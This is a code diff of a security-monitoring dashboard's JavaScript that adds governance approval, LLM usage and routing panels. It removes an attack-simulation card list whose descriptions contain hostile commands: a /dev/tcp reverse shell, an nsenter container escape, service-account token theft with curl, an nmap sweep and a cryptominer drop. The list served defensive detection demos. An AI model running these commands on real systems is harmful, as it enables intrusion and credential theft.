-                ? '<div style="color:#606080;font-size:13px;padding:8px 0;">No alerts yet. Try the <strong>Attack Simulation</strong> tab to inject test events.</div>'
+                ? '<div style="color:#606080;font-size:13px;padding:8px 0;">No alerts yet. Generate real detections by running <strong>scripts/run-live-attacks.sh</strong>.</div>'
                 : recent.map(a=>{const s=sevInfo(a.severity);return `<div class="alert-row"><span style="font-family:monospace;font-size:11px;color:#606080;min-width:60px;">${fmtTime(a.timestamp)}</span><span class="sev-badge ${s.cls}">${s.short}&nbsp;${a.severity}</span><span style="padding:2px 7px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${esc(a.source||'falco')}</span><span style="flex:1;font-size:12px;color:#c0c0d0;">${esc(a.rule||'Unknown Rule')}</span></div>`;}).join('');
         }
         this.health(health);
@@ -473,20 +850,361 @@ const render = {
         }
         const entries=Object.entries(data);
         if (!entries.length) { el.innerHTML='<div style="color:#606080;font-size:12px;">No providers configured.</div>'; return; }
+        const fmtReset = (iso) => {
+            try { return iso ? new Date(String(iso)).toLocaleString() : null; } catch { return null; }
+        };
         el.innerHTML=entries.map(([name,info])=>{
             const status=info?.status||'unknown';
             const credits=info?.credits;
             const color=STATUS_COLOR[status]||'#606080';
             const credText=credits!=null?`$${Number(credits).toFixed(2)} ${info.currency||'USD'}`:status.replace('_',' ');
-            return `<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><div style="width:7px;height:7px;border-radius:50%;background:${color};flex-shrink:0;"></div><span style="font-size:13px;flex:1;">${esc(DISPLAY[name]||name)}</span><span style="font-size:12px;font-family:monospace;color:${color};">${esc(credText)}</span></div>`;
+            const rem = info?.rate_limit_remaining;
+            const reset = fmtReset(info?.rate_limit_reset);
+            const rtt = info?.response_time_ms;
+            const metaParts = [];
+            if (rem != null) metaParts.push(`remaining ${Number(rem).toLocaleString()}`);
+            if (reset) metaParts.push(`reset ${reset}`);
+            if (rtt != null) metaParts.push(`${Number(rtt).toFixed(0)}ms`);
+            const meta = metaParts.length ? metaParts.join(' · ') : '';
+            const metaHtml = meta
+                ? `<div style="margin-left:15px;margin-top:2px;font-size:11px;color:#606080;font-family:monospace;">rate limit: ${esc(meta)}</div>`
+                : '';
+            return `
+                <div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.04);">
+                    <div style="display:flex;align-items:center;gap:8px;">
+                        <div style="width:7px;height:7px;border-radius:50%;background:${color};flex-shrink:0;"></div>
+                        <span style="font-size:13px;flex:1;">${esc(DISPLAY[name]||name)}</span>
+                        <span style="font-size:12px;font-family:monospace;color:${color};">${esc(credText)}</span>
+                    </div>
+                    ${metaHtml}
+                </div>
+            `;
         }).join('');
     },
     pills(health, gov) {
         const cp=$('clusterPill'); if(cp){const ok=health?.components?.kubernetes==='connected';cp.className='pill '+(ok?'pill-ok':'pill-err');cp.textContent=ok?'K8s Connected':'K8s Disconnected';}
         const lp=$('llmPill'); if(lp&&health){const cnt=health.llm_provider_count||0;const tot=health.llm_providers_total||cnt;lp.className='pill '+(cnt>0?'pill-ok':'pill-err');lp.textContent=cnt>0?`${cnt}/${tot>0?tot:cnt} LLM OK`:'No LLM';}
-        const gp=$('govPill'); if(gp&&gov){const m=gov.mode||'assisted';gp.textContent=m.charAt(0).toUpperCase()+m.slice(1);gp.className='pill '+(m==='autopilot'?'pill-warn':'pill-ok');}
+        const gp=$('govPill');
+        if (gp) {
+            gp.style.cursor = 'pointer';
+            gp.onclick = () => app.switchTab('governance');
+            if (gov && typeof gov === 'object') {
+                const raw = String(gov.mode || 'assisted').toLowerCase();
+                // UI only supports three modes; anything else is treated as Manual.
+                const allowed = { manual:1, assisted:1, autonomous:1 };
+                const m = allowed[raw] ? raw : 'manual';
+                const label = m === 'manual' ? '🔒 Manual' : m === 'autonomous' ? '✅ Auto' : '⚡ Assisted';
+                const cls = m === 'manual' ? 'pill-err' : m === 'assisted' ? 'pill-warn' : 'pill-ok';
+                gp.className = 'pill ' + cls;
+                gp.textContent = label;
+            } else {
+                gp.className = 'pill';
+                gp.textContent = 'Automation —';
+            }
+        }
         const up=$('uptimeLabel'); if(up&&health?.uptime_seconds) up.textContent='Uptime: '+fmtDuration(health.uptime_seconds);
     },
+
+    governance(gov, pending) {
+        const status = (gov && typeof gov === 'object') ? gov : {};
+        const rawMode = String(status.mode || 'assisted').toLowerCase();
+        const allowed = { manual:1, assisted:1, autonomous:1 };
+        const mode = allowed[rawMode] ? rawMode : 'manual';
+
+        const pill = $('govModePill');
+        const help = $('govModeHelp');
+        const desc = $('govModeDesc');
+
+        const label = mode === 'manual' ? '🔒 Manual' : mode === 'autonomous' ? '✅ Auto' : '⚡ Assisted';
+        const cls = mode === 'manual' ? 'pill-err' : mode === 'assisted' ? 'pill-warn' : 'pill-ok';
+
+        if (pill) { pill.className = 'pill ' + cls; pill.textContent = label; }
+        if (help) {
+            help.textContent = mode === 'manual'
+                ? 'Every action requires approval.'
+                : mode === 'assisted'
+                    ? 'Higher-risk actions require approval.'
+                    : 'Actions execute automatically when confidence thresholds are met.';
+        }
+        if (desc) {
+            desc.textContent = 'Controls whether Kubernetes response actions run automatically or require approval.';
+        }
+
+        const metrics = status.metrics || {};
+        const approved = Number(metrics.approved || 0);
+        const rejected = Number(metrics.rejected || 0);
+        const pendingCount = Number(status.pending_count || metrics.pending_approval || 0);
+        const a=$('govApproved'); if(a) a.textContent = String(approved);
+        const r=$('govRejected'); if(r) r.textContent = String(rejected);
+        const p=$('govPending');  if(p) p.textContent = String(pendingCount);
+
+        // Highlight active mode button
+        const setActive = (id, active) => {
+            const el = $(id);
+            if (!el) return;
+            el.style.outline = active ? '2px solid rgba(0,240,255,0.55)' : 'none';
+            el.style.boxShadow = active ? '0 0 0 3px rgba(0,240,255,0.15)' : 'none';
+        };
+        setActive('govBtnManual', mode === 'manual');
+        setActive('govBtnAssisted', mode === 'assisted');
+        setActive('govBtnAutonomous', mode === 'autonomous');
+
+        const list = $('govPendingList');
+        const actions = (pending && pending.actions) ? pending.actions : [];
+        if (!list) return;
+
+        if (!actions.length) {
+            list.innerHTML = '<div style="color:#606080;font-size:13px;">No pending actions right now.</div>';
+            return;
+        }
+
+        const btnStyle = (bg, bd, fg) => `padding:6px 10px;background:${bg};border:1px solid ${bd};color:${fg};border-radius:8px;font-size:12px;cursor:pointer;`;
+        list.innerHTML = actions
+            .sort((a,b)=>(b.severity||0)-(a.severity||0))
+            .slice(0, 50)
+            .map(act => {
+                const s = sevInfo(act.severity || 0);
+                const age = act.age_seconds != null ? Math.round(act.age_seconds) + 's' : '—';
+                const reason = act.reason || '';
+                return `
+                    <div style="border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px;margin-bottom:10px;background:rgba(0,0,0,0.18);">
+                        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+                            <span class="sev-badge ${s.cls}" title="${esc(s.label)}">${s.short}&nbsp;${act.severity}</span>
+                            <span style="font-size:13px;font-weight:800;color:#fff;">${esc(act.action_type||'action')}</span>
+                            <span style="font-size:12px;color:#a0a0b0;">→ ${esc(act.target||'—')}</span>
+                            <span style="margin-left:auto;font-size:11px;color:#606080;font-family:monospace;">age ${esc(age)}</span>
+                        </div>
+                        <div style="margin-top:8px;font-size:12px;color:#a0a0b0;line-height:1.5;">${esc(reason)}</div>
+                        <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
+                            <button onclick="app.approvePending('${esc(act.id)}')" style="${btnStyle('rgba(0,255,136,0.12)','rgba(0,255,136,0.25)','#00ff88')}"><i class=\"fas fa-check mr-1\"></i>Approve</button>
+                            <button onclick="app.rejectPending('${esc(act.id)}')" style="${btnStyle('rgba(255,51,102,0.12)','rgba(255,51,102,0.25)','#ff6688')}"><i class=\"fas fa-times mr-1\"></i>Reject</button>
+                        </div>
+                    </div>
+                `;
+            })
+            .join('');
+    },
+    // LLM Control Center render functions
+    llmControl(status, comparison, healthSummary, usage, usageWeek) {
+        const actEl = $('llmCtrlActive');
+        const tokensEl = $('llmCtrlTokens');
+        const tokensSubEl = $('llmCtrlTokensSub');
+        const costEl = $('llmCtrlCost');
+        const costSubEl = $('llmCtrlCostSub');
+
+        const costWeekEl = $('llmCtrlCostWeek');
+        const costWeekSubEl = $('llmCtrlCostWeekSub');
+        const tokensWeekEl = $('llmCtrlTokensWeek');
+        const tokensWeekSubEl = $('llmCtrlTokensWeekSub');
+        const callsWeekEl = $('llmCtrlCallsWeek');
+        const callsWeekSubEl = $('llmCtrlCallsWeekSub');
+
+        const totals = usage?.totals || {};
+        const callsToday = Number(totals.calls || 0);
+        const tokensToday = Number(totals.tokens || 0);
+        const promptToday = Number(totals.prompt_tokens || 0);
+        const completionToday = Number(totals.completion_tokens || 0);
+        const costToday = Number(totals.estimated_cost_usd || 0);
+        const threshold = Number(usage?.cost_threshold_usd || 5.0);
+
+        if (actEl) actEl.textContent = (status?.effective_provider || status?.active_provider || usage?.active_provider || 'AUTO').toUpperCase();
+        if (tokensEl) tokensEl.textContent = isFinite(tokensToday) ? tokensToday.toLocaleString() : '0';
+        if (tokensSubEl) tokensSubEl.textContent = `prompt ${promptToday.toLocaleString()} · completion ${completionToday.toLocaleString()}`;
+        if (costEl) {
+            costEl.textContent = '$' + (isFinite(costToday) ? costToday.toFixed(2) : '0.00');
+            costEl.style.color = (costToday > threshold) ? '#f87171' : '#4ade80';
+        }
+        if (costSubEl) costSubEl.textContent = `${callsToday.toLocaleString()} calls today · threshold $${threshold.toFixed(2)}`;
+
+        // Weekly totals (last 7 days)
+        const wTotals = usageWeek?.totals || {};
+        const callsWeek = Number(wTotals.calls || 0);
+        const tokensWeek = Number(wTotals.tokens || 0);
+        const promptWeek = Number(wTotals.prompt_tokens || 0);
+        const completionWeek = Number(wTotals.completion_tokens || 0);
+        const costWeek = Number(wTotals.estimated_cost_usd || 0);
+
+        if (costWeekEl) costWeekEl.textContent = '$' + (isFinite(costWeek) ? costWeek.toFixed(2) : '0.00');
+        if (costWeekSubEl) costWeekSubEl.textContent = `${callsWeek.toLocaleString()} calls · window: last 7 days`;
+        if (tokensWeekEl) tokensWeekEl.textContent = isFinite(tokensWeek) ? tokensWeek.toLocaleString() : '0';
+        if (tokensWeekSubEl) tokensWeekSubEl.textContent = `prompt ${promptWeek.toLocaleString()} · completion ${completionWeek.toLocaleString()}`;
+        if (callsWeekEl) callsWeekEl.textContent = isFinite(callsWeek) ? callsWeek.toLocaleString() : '0';
+        if (callsWeekSubEl) callsWeekSubEl.textContent = usageWeek?.start_utc && usageWeek?.end_utc ? `window: ${String(usageWeek.start_utc).replace('Z','')} → ${String(usageWeek.end_utc).replace('Z','')}` : 'DB-backed usage window';
+
+        // Provider breakdown table (today)
+        const tbody = $('llmUsageTableBody');
+        if (tbody) {
+            const providers = Array.isArray(usage?.providers) ? usage.providers : [];
+            const diagRows = Array.isArray(comparison?.providers) ? comparison.providers : [];
+            const diagByName = {};
+            diagRows.forEach(r => { diagByName[String(r.provider||'').toLowerCase()] = r; });
+
+            const statusPill = (raw) => {
+                const s = String(raw||'unknown').toLowerCase();
+                if (s === 'operational' || s === 'healthy') return { label: 'Healthy', c: '#4ade80', bg: 'rgba(34,197,94,0.12)', bd:'rgba(34,197,94,0.25)' };
+                if (s === 'degraded' || s === 'cooldown' || s === 'warning') return { label: 'Degraded', c: '#facc15', bg: 'rgba(250,204,21,0.12)', bd:'rgba(250,204,21,0.25)' };
+                if (s === 'not_configured') return { label: 'Not Configured', c: '#a0a0b0', bg: 'rgba(160,160,176,0.10)', bd:'rgba(160,160,176,0.18)' };
+                return { label: 'Unhealthy', c: '#f87171', bg: 'rgba(248,113,113,0.12)', bd:'rgba(248,113,113,0.25)' };
+            };
+
+            if (!providers.length) {
+                tbody.innerHTML = '<tr><td colspan="5" style="padding:12px 8px;color:#606080;">No LLM calls logged today yet.</td></tr>';
+            } else {
+                tbody.innerHTML = providers
+                    .slice()
+                    .sort((a,b)=>Number(b.estimated_cost_usd||0)-Number(a.estimated_cost_usd||0))
+                    .map(p => {
+                        const name = String(p.provider||'unknown');
+                        const diag = diagByName[name.toLowerCase()] || {};
+                        const st = statusPill(diag.status);
+                        const pill = `<span style="display:inline-flex;align-items:center;gap:6px;padding:3px 10px;border-radius:999px;background:${st.bg};border:1px solid ${st.bd};color:${st.c};font-weight:700;font-size:11px;">${esc(st.label)}</span>`;
+                        return `
+                            <tr style="border-bottom:1px solid rgba(255,255,255,0.06);">
+                                <td style="padding:10px 8px;color:#fff;font-weight:800;">${esc(name.toUpperCase())}</td>
+                                <td style="padding:10px 8px;">${pill}</td>
+                                <td style="padding:10px 8px;color:#a0a0b0;font-family:monospace;">${Number(p.calls||0).toLocaleString()}</td>
+                                <td style="padding:10px 8px;color:#a0a0b0;font-family:monospace;">${Number(p.tokens||0).toLocaleString()}</td>
+                                <td style="padding:10px 8px;color:#a0a0b0;font-family:monospace;">$${Number(p.estimated_cost_usd||0).toFixed(4)}</td>
+                            </tr>
+                        `;
+                    })
+                    .join('');
+            }
+        }
+        
+        // Update selectors
+        const providers = status?.providers || {};
+        const names = Object.keys(providers);
+        const selectable = names.filter(n => providers[n]?.configured !== false);
+        
+        const testSel = $('llmTestProvider'), forceSel = $('forceProviderSelect');
+        const options = selectable.map(n => `<option value="${n}">${n.toUpperCase()}</option>`).join('');
+        
+        if (testSel) testSel.innerHTML = '<option value="">Auto-select</option>' + options;
+        if (forceSel) forceSel.innerHTML = '<option value="">Automatic (failover)</option>' + options;
+        
+        // Render provider cards
+        this._renderProviderCards(status);
+        
+        // Render fallback chain
+        const chainEl = $('llmFallbackChain');
+        if (chainEl && status?.fallback_chain) {
+            chainEl.innerHTML = status.fallback_chain.map((name, i) => {
+                const p = providers[name] || {};
+                const isActive = name === status.effective_provider;
+                const isOk = p.status === 'operational' || p.status === 'healthy';
+                const cls = isOk ? 'healthy' : 'degraded';
+                return `<span class="chain-pill ${cls} ${isActive ? 'active' : ''}">${name.toUpperCase()}</span>` + 
+                       (i < status.fallback_chain.length - 1 ? ' <i class="fas fa-chevron-right" style="color:#606080;"></i> ' : '');
+            }).join('');
+        }
+    },
+    
+    _renderProviderCards(status) {
+        const opContainer = $('llmProviderCardsOperational');
+        const degContainer = $('llmProviderCardsDegraded');
+        const failContainer = $('llmProviderCardsFailed');
+        
+        if (!opContainer) return;
+        
+        const providers = status?.providers || {};
+        const names = Object.keys(providers);
+        
+        const operational = [], degraded = [], failed = [];
+        
+        names.forEach(name => {
+            const p = providers[name];
+            const card = this._createProviderCard(name, p);
+            if (p.status === 'operational' || p.status === 'healthy') {
+                operational.push(card);
+            } else if (p.status === 'cooldown' || p.status === 'degraded') {
+                degraded.push(card);
+            } else {
+                failed.push(card);
+            }
+        });
+        
+        if (opContainer) opContainer.innerHTML = operational.join('');
+        if (degContainer) degContainer.innerHTML = degraded.join('');
+        if (failContainer) failContainer.innerHTML = failed.join('');
+        
+        // Show/hide sections
+        const opSection = $('llmProvidersOperational');
+        const degSection = $('llmProvidersDegraded');
+        const failSection = $('llmProvidersFailed');
+        
+        if (opSection) opSection.style.display = operational.length ? 'block' : 'none';
+        if (degSection) degSection.style.display = degraded.length ? 'block' : 'none';
+        if (failSection) failSection.style.display = failed.length ? 'block' : 'none';
+    },
+    
+    _createProviderCard(name, p) {
+        const status = p?.status || 'unknown';
+        const isOk = status === 'operational' || status === 'healthy';
+        const isCooldown = status === 'cooldown';
+        
+        let statusIcon = 'fa-circle';
+        let statusColor = '#606080';
+        
+        if (isOk) { statusIcon = 'fa-check-circle'; statusColor = '#22c55e'; }
+        else if (isCooldown) { statusIcon = 'fa-clock'; statusColor = '#facc15'; }
+        else if (status === 'not_configured') { statusIcon = 'fa-ban'; statusColor = '#64748b'; }
+        else { statusIcon = 'fa-times-circle'; statusColor = '#ef4444'; }
+        
+        return `<div class="provider-card ${isOk ? 'operational' : isCooldown ? 'degraded' : 'failed'}">
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <span class="provider-status-dot ${isOk ? 'operational' : isCooldown ? 'degraded' : 'failed'}"></span>
+                    <strong style="font-size:14px;text-transform:uppercase;">${name}</strong>
+                </div>
+                <span style="font-size:11px;color:#606080;background:rgba(0,0,0,0.3);padding:2px 8px;border-radius:4px;">${p?.model || 'unknown'}</span>
+            </div>
+            <div style="font-size:12px;color:#a0a0b0;margin-bottom:8px;">
+                <i class="fas ${statusIcon}" style="color:${statusColor};margin-right:4px;"></i>${status}
+            </div>
+            <div style="display:flex;gap:6px;">
+                <button onclick="app.testProviderKey('${name}')" style="padding:5px 10px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);color:#fff;border-radius:6px;font-size:11px;">Test Key</button>
+                <button onclick="app.probeProvider('${name}')" style="padding:5px 10px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);color:#fff;border-radius:6px;font-size:11px;">Probe</button>
+            </div>
+        </div>`;
+    },
+    
+    llmUsageCompare(stats, llmControl, comparison) {
+        const el = $('llmUsageCompare');
+        if (!el) return;
+        
+        const rows = comparison?.providers || [];
+        if (!rows.length) {
+            el.innerHTML = '<div style="text-align:center;padding:20px;color:#606080;"><i class="fas fa-chart-bar" style="font-size:32px;margin-bottom:12px;opacity:0.3;"></i><div>No provider usage data yet</div><div style="font-size:11px;margin-top:6px;">Metrics appear after LLM analysis begins</div></div>';
+            return;
+        }
+        
+        el.innerHTML = '<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="font-size:10px;color:#606080;text-transform:uppercase;background:rgba(0,0,0,0.25);"><th style="padding:10px;text-align:left;">Provider</th><th style="padding:10px;text-align:right;">Calls</th><th style="padding:10px;text-align:right;">Tokens</th><th style="padding:10px;text-align:right;">Cost</th><th style="padding:10px;text-align:center;">Success</th></tr></thead><tbody>' +
+            rows.map(r => `<tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:10px;font-weight:600;">${r.provider?.toUpperCase() || '—'}</td><td style="padding:10px;text-align:right;color:#c0c0d0;">${r.attempts || 0}</td><td style="padding:10px;text-align:right;color:#c0c0d0;">${r.tokens_total || 0}</td><td style="padding:10px;text-align:right;color:#c0c0d0;">$${Number(r.total_estimated_cost_usd || 0).toFixed(3)}</td><td style="padding:10px;text-align:center;"><span style="padding:2px 8px;border-radius:4px;font-size:11px;background:${(r.success_rate || 0) >= 0.9 ? 'rgba(34,197,94,0.15)' : 'rgba(250,204,21,0.15)'};color:${(r.success_rate || 0) >= 0.9 ? '#4ade80' : '#facc15'};">${Math.round((r.success_rate || 0) * 100)}%</span></td></tr>`).join('') +
+            '</tbody></table>';
+    },
+    
+    llmRouting(routing, risk) {
+        const sumEl = $('llmRoutingSummary'), riskEl = $('llmPredictiveRisk');
+        const modeSel = $('llmRoutingMode');
+        
+        if (modeSel && routing?.mode) modeSel.value = routing.mode;
+        
+        if (sumEl) {
+            sumEl.innerHTML = routing ? `<div style="padding:10px;background:rgba(0,0,0,0.2);border-radius:6px;"><div style="font-size:12px;color:#a0a0b0;">Mode: <span style="color:#fff;font-weight:600;">${routing.mode || 'priority'}</span></div><div style="font-size:12px;color:#a0a0b0;margin-top:4px;">Cost ceiling: $${routing.cost_ceiling_usd || 0.005}/call</div></div>` : 'Loading...';
+        }
+        
+        if (riskEl && risk) {
+            if (risk.risk_score != null) {
+                const score = Math.round(risk.risk_score);
+                const color = score >= 70 ? '#ef4444' : score >= 40 ? '#facc15' : '#22c55e';
+                riskEl.innerHTML = `<div style="display:flex;align-items:center;gap:16px;"><div style="text-align:center;"><div style="font-size:32px;font-weight:700;color:${color};">${score}</div><div style="font-size:10px;color:#606080;text-transform:uppercase;">Risk Score</div></div><div style="flex:1;"><div style="font-size:14px;font-weight:600;color:${color};">${score >= 70 ? 'HIGH' : score >= 40 ? 'ELEVATED' : 'NORMAL'} RISK</div><div style="font-size:12px;color:#a0a0b0;">${risk.recommendation || 'Monitoring...'}</div><div style="margin-top:8px;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;overflow:hidden;"><div style="width:${score}%;height:100%;background:${color};"></div></div></div></div>`;
+            } else {
+                riskEl.innerHTML = '<div style="text-align:center;padding:20px;color:#606080;"><i class="fas fa-chart-area" style="font-size:24px;margin-bottom:8px;opacity:0.5;"></i><div style="font-size:12px;">Collecting alert data...</div><div style="font-size:11px;margin-top:4px;">Risk forecast appears after processing 20+ alerts</div></div>';
+            }
+        }
+    },
+
     alertsTable(data, sevFilter) {
         const el=$('alertsTable'); if(!el) return;
         if (!data?.alerts) { el.innerHTML='<div style="padding:40px;text-align:center;color:#606080;">Failed to load alerts.</div>'; return; }
@@ -554,42 +1272,6 @@ const render = {
             ];
             svcEl.innerHTML=`<h3 style="font-size:14px;font-weight:700;margin-bottom:6px;">Services <span style="font-size:11px;color:#606080;font-weight:400;">— stable network endpoints</span></h3><p style="font-size:12px;color:#606080;margin:0 0 10px;line-height:1.5;">Pods restart and move; services provide a fixed name + port so other components always know how to reach them.</p><table style="width:100%;border-collapse:collapse;font-size:12px;">${svcs.map(s=>`<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px;font-family:'JetBrains Mono',monospace;">${s[0]}</td><td style="padding:8px;"><span style="padding:2px 6px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${s[1]}</span></td><td style="padding:8px;color:#606080;">${s[2]}</td><td style="padding:8px;color:#606080;">${s[3]}</td></tr>`).join('')}</table>`;
         }
-    },
-    attacks() {
-        const grid=$('attackGrid'); if(!grid) return;
-        const scenarios=[
-            // ── Row 1: Network / Denial of Service ──
-            {id:0, name:'ONVIF Camera DDoS',         cat:'Denial of Service',    sev:9,  mitre:'T0866', icon:'📡', color:'#f87171',
-             desc:'UDP/SYN flood (200K pps) targeting ONVIF Profile S on traffic-camera pods. Saturates camera feed pipeline, disabling real-time ANPR license plate capture across all city intersections.'},
-            {id:1, name:'MQTT Broker Flood',          cat:'Denial of Service',    sev:7,  mitre:'T0814', icon:'📶', color:'#fb923c',
-             desc:'10,000 rogue CONNECT packets per second overwhelm the unauthenticated MQTT broker (port 1883). All downstream IoT sensors lose telemetry connectivity — parking, environment, lighting all go dark.'},
-            // ── Row 2: Execution / Shell Access ──
-            {id:2, name:'Reverse Shell – Healthcare', cat:'Execution',             sev:8,  mitre:'T0807', icon:'🐚', color:'#fb923c',
-             desc:'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 executed inside the FHIR R4 healthcare-api container. Falco detects shell spawn via eBPF syscall hook. Attacker gains interactive access to patient record filesystem.'},
-            {id:3, name:'Cryptominer in Camera Pod',  cat:'Execution',             sev:8,  mitre:'T0871', icon:'⛏️', color:'#fbbf24',
-             desc:'xmrig binary dropped to /tmp and executed in traffic-camera container. CPU usage spikes to 100%, degrading ANPR processing latency. Outbound stratum+tcp connections to mining pool trigger Suricata ET MALWARE rules.'},
-            // ── Row 3: ICS / OT Manipulation ──
-            {id:4, name:'Modbus Register Overwrite',  cat:'Impair Process Ctrl',   sev:9,  mitre:'T0836', icon:'⚙️', color:'#a78bfa',
-             desc:'Modbus FC6 (Write Single Register) writes 0xFFFF to env-sensor OPC UA holding registers controlling AQI thresholds. Falsifies air quality readings city-wide — emergency response disabled on spoofed clean-air reports.'},
-            {id:5, name:'DALI-2 Lighting Blackout',   cat:'Impair Process Ctrl',   sev:9,  mitre:'T0879', icon:'💡', color:'#a78bfa',
-             desc:'TALQ v2.4 command sent to street-lighting gateway setting all 10,000 luminaires to 0% brightness via DALI broadcast. Full city-block blackout; Falco detects unexpected syscall burst from lighting-gateway process.'},
-            // ── Row 4: Data Exfiltration / Tampering ──
-            {id:6, name:'FHIR Patient Record Tamper', cat:'Impact',                sev:10, mitre:'T0831', icon:'☠️', color:'#b91c1c',
-             desc:'HTTP PUT to /fhir/Patient/{id}/MedicationRequest modifies insulin dosage field from 10U to 100U — a 10x overdose. Critical patient safety event. Suricata detects abnormal FHIR PUT rate; Falco detects DB write anomaly.'},
-            {id:7, name:'ANPR Plate Data Exfil',      cat:'Data Exfiltration',     sev:8,  mitre:'T0867', icon:'🚗', color:'#ef4444',
-             desc:'Attacker exfiltrates /var/lib/anpr/plates.db via DNS tunneling (50-byte TXT queries every 200ms). Contains license plate images + timestamps for 24h of city traffic. Suricata detects anomalous DNS query volume.'},
-            // ── Row 5: Privilege Escalation / Lateral Movement ──
-            {id:8, name:'Container Escape via /proc',cat:'Privilege Escalation',  sev:9,  mitre:'T0890', icon:'🔓', color:'#f87171',
-             desc:'nsenter --target 1 --mount --uts --ipc --net --pid executed inside parking-system pod. Full host namespace access achieved — Falco rule Container Escape via nsenter fires. Attacker has root on K3s worker node.'},
-            {id:9, name:'MQTT→OPC UA Pivot',          cat:'Lateral Movement',      sev:8,  mitre:'T0843', icon:'↔️', color:'#6366f1',
-             desc:'Compromised MQTT broker used as pivot: attacker subscribes to env/+/readings, replays manipulated packets to OPC UA server on env-sensor-service:4840. Cross-protocol lateral movement between asset domains.'},
-            // ── Row 6: Reconnaissance / Discovery ──
-            {id:10,name:'Service Mesh Recon Scan',    cat:'Discovery',             sev:6,  mitre:'T0846', icon:'🔍', color:'#facc15',
-             desc:'nmap -sV -p- 10.43.0.0/16 run from compromised parking-system pod. Maps all ClusterIP services — discovers unauthenticated MQTT, OPC UA, Modbus endpoints. Suricata ET SCAN rule fires within 3 seconds.'},
-            {id:11,name:'K8s API Credential Harvest',  cat:'Credential Access',    sev:8,  mitre:'T0552', icon:'🗝️', color:'#f59e0b',
-             desc:'cat /var/run/secrets/kubernetes.io/serviceaccount/token + curl https://kubernetes.default.svc/api — attacker harvests default service account JWT to call Kubernetes API from inside parking-system container.'}
-        ];
-        grid.innerHTML=scenarios.map(s=>`<div class="attack-card" onclick="app.launchAttack(${s.id})" style="border-left:3px solid ${s.color};"><div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;"><span style="font-size:22px;">${s.icon}</span><div style="font-size:14px;font-weight:700;color:${s.color};">${esc(s.name)}</div></div><div style="font-size:12px;color:#a0a0b0;margin-bottom:10px;line-height:1.5;">${esc(s.desc)}</div><div style="display:flex;gap:6px;flex-wrap:wrap;"><span class="sev-badge ${sevInfo(s.sev).cls}">${sevInfo(s.sev).label}</span><span style="padding:2px 8px;border-radius:4px;font-size:10px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);">${esc(s.cat)}</span><span style="padding:2px 8px;border-radius:4px;font-size:10px;background:rgba(255,255,255,0.05);color:#606080;">${esc(s.mitre)}</span></div></div>`).join('');
     }
 };
 
@@ -598,16 +1280,15 @@ const app = {
     currentTab: 'overview',
     lastData:   {},
     pollTimer:  null,
-    atkRuns:    0,
 
     async login() {
-        const user=($('loginUser')?.value||'').trim(), pass=$('loginPass')?.value||'';
+        const user=($('loginUser')?.value||'').trim(), pass=($('loginPass')?.value||'').trim();
         const errEl=$('loginError'), btn=$('loginBtn');
         if (!user||!pass) { errEl.textContent='Please enter username and password.'; errEl.style.display='block'; return; }
         btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin" style="margin-right:8px;"></i>Authenticating…'; errEl.style.display='none';
         try {
             const res=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass})});
-            const data=await res.json();
+            const data=await res.json().catch(()=>({ detail: `HTTP ${res.status}` }));
             if (data?.access_token) {
                 api.token=data.access_token; localStorage.setItem(CFG.TOKEN_KEY,data.access_token); this._showDashboard();
             } else {
@@ -628,7 +1309,6 @@ const app = {
 
     _showDashboard() {
         $('loginScreen').style.display='none'; $('dashboard').style.display='block'; $('liveFeedCard').style.display='block';
-        render.attacks();
         this.refreshAll();
         this.pollTimer=setInterval(()=>this.refreshAll(),CFG.POLL);
         // Credits change rarely — check every 60s instead of 15s
@@ -647,7 +1327,176 @@ const app = {
         if (tab==='alerts') {
             const badge=$('alertBadge'); if(badge){badge.textContent='';badge.style.display='none';}
         }
+        if (tab==='governance') {
+            // Pending actions are not fetched in refreshAll() — load them on demand.
+            this.refreshGovernance(false);
+        }
         this._renderTab(tab);
+    },
+
+    async refreshGovernance(force=false) {
+        // force is unused currently; keep signature stable.
+        const [status, pending] = await Promise.all([
+            api.getGov(),
+            api.getGovPending(),
+        ]);
+        this.lastData.gov = status;
+        this.lastData.govPending = pending;
+        render.governance(status, pending);
+    },
+
+    async setAutomationMode(mode) {
+        const res = await api.setGovMode(mode);
+        if (res?.status === 'success') {
+            this.setNotice(`Automation mode set: ${String(mode).toUpperCase()}`, 'info', 2000);
+        } else {
+            this.setNotice(res?.reason || 'Failed to change mode', 'warn', 3500);
+        }
+        await this.refreshGovernance(false);
+        // Refresh pills in header too
+        this.refreshAll();
+    },
+
+    async approvePending(id) {
+        const comment = prompt('Optional comment for audit trail (approve):', '') || '';
+        const res = await api.approveGovAction(id, comment);
+        if (res?.status && String(res.status).startsWith('approved')) this.setNotice('Approved and executed', 'info', 2500);
+        else this.setNotice(res?.detail || res?.error || res?.status || 'Approve failed', 'warn', 3500);
+        await this.refreshGovernance(false);
+        this.refreshAll();
+    },
+
+    async rejectPending(id) {
+        const reason = prompt('Reason (reject):', 'Not appropriate for this environment') || '';
+        const res = await api.rejectGovAction(id, reason);
+        if (res?.status === 'rejected') this.setNotice('Rejected', 'info', 2500);
+        else this.setNotice(res?.detail || res?.error || res?.status || 'Reject failed', 'warn', 3500);
+        await this.refreshGovernance(false);
+        this.refreshAll();
+    },
+
+    async refreshLLMControl(probe=false) {
+        await this.withBusyButton('liveProbeBtn', probe?'Probing…':'Refreshing…', async () => {
